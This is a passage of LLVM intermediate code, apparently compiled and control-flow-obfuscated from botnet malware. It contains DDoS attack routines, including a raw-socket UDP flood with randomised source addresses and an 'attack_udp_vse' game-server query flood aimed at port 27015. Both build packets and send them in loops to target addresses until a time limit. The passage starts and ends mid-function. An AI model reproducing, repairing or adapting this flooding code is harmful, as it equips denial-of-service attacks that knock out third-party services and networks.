  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 3
  store i16 %138, i16* %140, align 4
  %141 = load i8, i8* %16, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 5
  store i8 %141, i8* %143, align 4
  %144 = load i8, i8* %17, align 1
  %145 = icmp ne i8 %144, 0
  %146 = select i1 %145, i32 -1121453600, i32 801458690
  store i32 %146, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 4
  store i16 %148, i16* %150, align 2
  store i32 801458690, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 6
  store i8 17, i8* %153, align 1
  %154 = load i32, i32* %22, align 4
  %155 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 8
  store i32 %154, i32* %156, align 4
  %157 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 1
  %162 = load i32, i32* %161, align 4
  %163 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 9
  store i32 %162, i32* %164, align 4
  %165 = load i16, i16* %18, align 2
  %166 = call zeroext i16 @htons(i16 zeroext %165) #7
  %167 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %168 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %167, i32 0, i32 0
  store i16 %166, i16* %168, align 2
  %169 = load i16, i16* %19, align 2
  %170 = call zeroext i16 @htons(i16 zeroext %169) #7
  %171 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %172 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %171, i32 0, i32 1
  store i16 %170, i16* %172, align 2
  %173 = load i16, i16* %20, align 2
  %174 = zext i16 %173 to i64
  %175 = add i64 8, %174
  %176 = trunc i64 %175 to i16
  %177 = call zeroext i16 @htons(i16 zeroext %176) #7
  %178 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %179 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %178, i32 0, i32 2
  store i16 %177, i16* %179, align 2
  store i32 1532528474, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = load i32, i32* %11, align 4
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %11, align 4
  store i32 -1783873699, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  store i32 -2036075837, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1737114187, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i32, i32* %11, align 4
  %187 = load i8, i8* %7, align 1
  %188 = zext i8 %187 to i32
  %189 = icmp slt i32 %186, %188
  %190 = select i1 %189, i32 -1212422533, i32 1652238684
  store i32 %190, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = load i8**, i8*** %13, align 8
  %193 = load i32, i32* %11, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds i8*, i8** %192, i64 %194
  %196 = load i8*, i8** %195, align 8
  store i8* %196, i8** %26, align 8
  %197 = load i8*, i8** %26, align 8
  %198 = bitcast i8* %197 to %struct.iphdr*
  store %struct.iphdr* %198, %struct.iphdr** %27, align 8
  %199 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i64 1
  %201 = bitcast %struct.iphdr* %200 to %struct.udphdr*
  store %struct.udphdr* %201, %struct.udphdr** %28, align 8
  %202 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %203 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %202, i64 1
  %204 = bitcast %struct.udphdr* %203 to i8*
  store i8* %204, i8** %29, align 8
  %205 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %206 = load i32, i32* %11, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i64 %207
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i32 0, i32 2
  %210 = load i8, i8* %209, align 4
  %211 = zext i8 %210 to i32
  %212 = icmp slt i32 %211, 32
  %213 = select i1 %212, i32 -1739185091, i32 -1475799674
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %216 = load i32, i32* %11, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i64 %217
  %219 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %218, i32 0, i32 1
  %220 = load i32, i32* %219, align 4
  %221 = call i32 @ntohl(i32 %220) #7
  %222 = call i32 @rand_next()
  %223 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %224 = load i32, i32* %11, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %223, i64 %225
  %227 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %226, i32 0, i32 2
  %228 = load i8, i8* %227, align 4
  %229 = zext i8 %228 to i32
  %230 = lshr i32 %222, %229
  %231 = add i32 %221, %230
  %232 = call i32 @htonl(i32 %231) #7
  %233 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 9
  store i32 %232, i32* %234, align 4
  store i32 -1475799674, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load i32, i32* %22, align 4
  %237 = icmp eq i32 %236, -1
  %238 = select i1 %237, i32 -1597120818, i32 -790244818
  store i32 %238, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = call i32 @rand_next()
  %241 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 8
  store i32 %240, i32* %242, align 4
  store i32 -790244818, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = load i16, i16* %15, align 2
  %245 = zext i16 %244 to i32
  %246 = icmp eq i32 %245, 65535
  %247 = select i1 %246, i32 -1858571803, i32 1217982647
  store i32 %247, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = call i32 @rand_next()
  %250 = trunc i32 %249 to i16
  %251 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 3
  store i16 %250, i16* %252, align 4
  store i32 1217982647, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i16, i16* %18, align 2
  %255 = zext i16 %254 to i32
  %256 = icmp eq i32 %255, 65535
  %257 = select i1 %256, i32 1847266420, i32 1357991639
  store i32 %257, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = call i32 @rand_next()
  %260 = trunc i32 %259 to i16
  %261 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %262 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %261, i32 0, i32 0
  store i16 %260, i16* %262, align 2
  store i32 1357991639, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i16, i16* %19, align 2
  %265 = zext i16 %264 to i32
  %266 = icmp eq i32 %265, 65535
  %267 = select i1 %266, i32 -1981405512, i32 1111597512
  store i32 %267, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = call i32 @rand_next()
  %270 = trunc i32 %269 to i16
  %271 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %272 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %271, i32 0, i32 1
  store i16 %270, i16* %272, align 2
  store i32 1111597512, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load i8, i8* %21, align 1
  %275 = icmp ne i8 %274, 0
  %276 = select i1 %275, i32 1113947455, i32 -1881556396
  store i32 %276, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i8*, i8** %29, align 8
  %279 = load i16, i16* %20, align 2
  %280 = zext i16 %279 to i32
  call void @rand_alphastr(i8* %278, i32 %280)
  %281 = load i8*, i8** %29, align 8
  %282 = load i16, i16* %20, align 2
  %283 = zext i16 %282 to i64
  %284 = getelementptr inbounds i8, i8* %281, i64 %283
  store i8 0, i8* %284, align 1
  store i32 -1881556396, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  %286 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i32 0, i32 7
  store i16 0, i16* %287, align 2
  %288 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %289 = bitcast %struct.iphdr* %288 to i16*
  %290 = call zeroext i16 @checksum_generic(i16* %289, i32 20)
  %291 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 7
  store i16 %290, i16* %292, align 2
  %293 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %294 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %293, i32 0, i32 3
  store i16 0, i16* %294, align 2
  %295 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %296 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %297 = bitcast %struct.udphdr* %296 to i8*
  %298 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %299 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %298, i32 0, i32 2
  %300 = load i16, i16* %299, align 2
  %301 = load i16, i16* %20, align 2
  %302 = zext i16 %301 to i64
  %303 = add i64 8, %302
  %304 = trunc i64 %303 to i32
  %305 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %295, i8* %297, i16 zeroext %300, i32 %304)
  %306 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %307 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %306, i32 0, i32 3
  store i16 %305, i16* %307, align 2
  %308 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %309 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %308, i32 0, i32 1
  %310 = load i16, i16* %309, align 2
  %311 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %312 = load i32, i32* %11, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 0
  %316 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %315, i32 0, i32 1
  store i16 %310, i16* %316, align 2
  %317 = load i32, i32* %12, align 4
  %318 = load i8*, i8** %26, align 8
  %319 = load i16, i16* %20, align 2
  %320 = zext i16 %319 to i64
  %321 = add i64 28, %320
  %322 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %323 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %324 = load i32, i32* %11, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i64 %325
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %326, i32 0, i32 0
  %328 = bitcast %struct.sockaddr_in* %327 to %struct.sockaddr*
  store %struct.sockaddr* %328, %struct.sockaddr** %322, align 8
  %329 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %330 = load %struct.sockaddr*, %struct.sockaddr** %329, align 8
  %331 = call i64 @sendto(i32 %317, i8* %318, i64 %321, i32 16384, %struct.sockaddr* %330, i32 16)
  store i32 840927688, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  %333 = load i32, i32* %11, align 4
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %11, align 4
  store i32 -1737114187, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %336 = call i64 @time(i64* null) #6
  %337 = load i32, i32* %23, align 4
  %338 = sext i32 %337 to i64
  %339 = icmp sgt i64 %336, %338
  %340 = select i1 %339, i32 1502090289, i32 1043754097
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  store i32 -1903852555, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  store i32 -2036075837, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %342, %341, %335, %332, %285, %277, %273, %268, %263, %258, %253, %248, %243, %239, %235, %214, %191, %185, %184, %183, %180, %151, %147, %102, %96, %95, %92, %86, %85, %81, %80, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 36)
  %63 = call i8* @table_retrieve_val(i32 36, i32* %21)
  store i8* %63, i8** %20, align 8
  %64 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %64, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %12, align 4
  %switchVar = alloca i32
  store i32 2053462587, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2053462587, label %first
    i32 860577699, label %67
    i32 103577586, label %68
    i32 -304281330, label %74
    i32 1704150190, label %77
    i32 315862717, label %78
    i32 1155917745, label %84
    i32 -1299421193, label %132
    i32 -2042509823, label %136
    i32 1700648861, label %172
    i32 1178275607, label %175
    i32 1109990166, label %176
    i32 -248379574, label %177
    i32 1801801348, label %183
    i32 -1556616422, label %203
    i32 412159428, label %224
    i32 -493210034, label %229
    i32 -2143830158, label %234
    i32 -677977428, label %239
    i32 -1013761162, label %244
    i32 93440364, label %249
    i32 -1402740216, label %254
    i32 1014390205, label %301
    i32 -1920898829, label %304
    i32 754638184, label %310
    i32 -185928306, label %311
    i32 1030077141, label %312
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %65 = icmp eq i32 %.reload, -1
  %66 = select i1 %65, i32 860577699, i32 103577586
  store i32 %66, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 1030077141, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %69 = load i32, i32* %12, align 4
  %70 = bitcast i32* %11 to i8*
  %71 = call i32 @setsockopt(i32 %69, i32 0, i32 3, i8* %70, i32 4) #6
  %72 = icmp eq i32 %71, -1
  %73 = select i1 %72, i32 -304281330, i32 1704150190
  store i32 %73, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i32, i32* %12, align 4
  %76 = call i32 @close(i32 %75)
  store i32 1030077141, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 315862717, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %11, align 4
  %80 = load i8, i8* %7, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp slt i32 %79, %81
  %83 = select i1 %82, i32 1155917745, i32 1178275607
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = call noalias i8* @calloc(i64 128, i64 1) #6
  %86 = load i8**, i8*** %13, align 8
  %87 = load i32, i32* %11, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8*, i8** %86, i64 %88
  store i8* %85, i8** %89, align 8
  %90 = load i8**, i8*** %13, align 8
  %91 = load i32, i32* %11, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8*, i8** %90, i64 %92
  %94 = load i8*, i8** %93, align 8
  %95 = bitcast i8* %94 to %struct.iphdr*
  store %struct.iphdr* %95, %struct.iphdr** %23, align 8
  %96 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i64 1
  %98 = bitcast %struct.iphdr* %97 to %struct.udphdr*
  store %struct.udphdr* %98, %struct.udphdr** %24, align 8
  %99 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %100 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %99, i64 1
  %101 = bitcast %struct.udphdr* %100 to i8*
  store i8* %101, i8** %25, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %103 = bitcast %struct.iphdr* %102 to i8*
  %104 = load i8, i8* %103, align 4
  %105 = and i8 %104, 15
  %106 = or i8 %105, 64
  store i8 %106, i8* %103, align 4
  %107 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %108 = bitcast %struct.iphdr* %107 to i8*
  %109 = load i8, i8* %108, align 4
  %110 = and i8 %109, -16
  %111 = or i8 %110, 5
  store i8 %111, i8* %108, align 4
  %112 = load i8, i8* %14, align 1
  %113 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i32 0, i32 1
  store i8 %112, i8* %114, align 1
  %115 = load i32, i32* %21, align 4
  %116 = sext i32 %115 to i64
  %117 = add i64 32, %116
  %118 = trunc i64 %117 to i16
  %119 = call zeroext i16 @htons(i16 zeroext %118) #7
  %120 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %121 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %120, i32 0, i32 2
  store i16 %119, i16* %121, align 2
  %122 = load i16, i16* %15, align 2
  %123 = call zeroext i16 @htons(i16 zeroext %122) #7
  %124 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i32 0, i32 3
  store i16 %123, i16* %125, align 4
  %126 = load i8, i8* %16, align 1
  %127 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 5
  store i8 %126, i8* %128, align 4
  %129 = load i8, i8* %17, align 1
  %130 = icmp ne i8 %129, 0
  %131 = select i1 %130, i32 -1299421193, i32 -2042509823
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %134 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 4
  store i16 %133, i16* %135, align 2
  store i32 -2042509823, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i32 0, i32 6
  store i8 17, i8* %138, align 1
  %139 = load i32, i32* @LOCAL_ADDR, align 4
  %140 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %141 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %140, i32 0, i32 8
  store i32 %139, i32* %141, align 4
  %142 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %143 = load i32, i32* %11, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %142, i64 %144
  %146 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %145, i32 0, i32 1
  %147 = load i32, i32* %146, align 4
  %148 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 9
  store i32 %147, i32* %149, align 4
  %150 = load i16, i16* %18, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %153 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %152, i32 0, i32 0
  store i16 %151, i16* %153, align 2
  %154 = load i16, i16* %19, align 2
  %155 = call zeroext i16 @htons(i16 zeroext %154) #7
  %156 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %157 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %156, i32 0, i32 1
  store i16 %155, i16* %157, align 2
  %158 = load i32, i32* %21, align 4
  %159 = sext i32 %158 to i64
  %160 = add i64 12, %159
  %161 = trunc i64 %160 to i16
  %162 = call zeroext i16 @htons(i16 zeroext %161) #7
  %163 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %164 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %163, i32 0, i32 2
  store i16 %162, i16* %164, align 2
  %165 = load i8*, i8** %25, align 8
  %166 = bitcast i8* %165 to i32*
  store i32 -1, i32* %166, align 4
  %167 = load i8*, i8** %25, align 8
  %168 = getelementptr inbounds i8, i8* %167, i64 4
  store i8* %168, i8** %25, align 8
  %169 = load i8*, i8** %25, align 8
  %170 = load i8*, i8** %20, align 8
  %171 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %169, i8* %170, i32 %171)
  store i32 1700648861, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %11, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %11, align 4
  store i32 315862717, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 1109990166, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -248379574, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %11, align 4
  %179 = load i8, i8* %7, align 1
  %180 = zext i8 %179 to i32
  %181 = icmp slt i32 %178, %180
  %182 = select i1 %181, i32 1801801348, i32 -1920898829
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i8**, i8*** %13, align 8
  %185 = load i32, i32* %11, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i8*, i8** %184, i64 %186
  %188 = load i8*, i8** %187, align 8
  store i8* %188, i8** %26, align 8
  %189 = load i8*, i8** %26, align 8
  %190 = bitcast i8* %189 to %struct.iphdr*
  store %struct.iphdr* %190, %struct.iphdr** %27, align 8
  %191 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i64 1
  %193 = bitcast %struct.iphdr* %192 to %struct.udphdr*
  store %struct.udphdr* %193, %struct.udphdr** %28, align 8
  %194 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %195 = load i32, i32* %11, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i64 %196
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i32 0, i32 2
  %199 = load i8, i8* %198, align 4
  %200 = zext i8 %199 to i32
  %201 = icmp slt i32 %200, 32
  %202 = select i1 %201, i32 -1556616422, i32 412159428
  store i32 %202, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %205 = load i32, i32* %11, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 1
  %209 = load i32, i32* %208, align 4
  %210 = call i32 @ntohl(i32 %209) #7
  %211 = call i32 @rand_next()
  %212 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %213 = load i32, i32* %11, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %212, i64 %214
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i32 0, i32 2
  %217 = load i8, i8* %216, align 4
  %218 = zext i8 %217 to i32
  %219 = lshr i32 %211, %218
  %220 = add i32 %210, %219
  %221 = call i32 @htonl(i32 %220) #7
  %222 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 9
  store i32 %221, i32* %223, align 4
  store i32 412159428, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i16, i16* %15, align 2
  %226 = zext i16 %225 to i32
  %227 = icmp eq i32 %226, 65535
  %228 = select i1 %227, i32 -493210034, i32 -2143830158
  store i32 %228, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = call i32 @rand_next()
  %231 = trunc i32 %230 to i16
  %232 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 3
  store i16 %231, i16* %233, align 4
  store i32 -2143830158, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i16, i16* %18, align 2
  %236 = zext i16 %235 to i32
  %237 = icmp eq i32 %236, 65535
  %238 = select i1 %237, i32 -677977428, i32 -1013761162
  store i32 %238, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
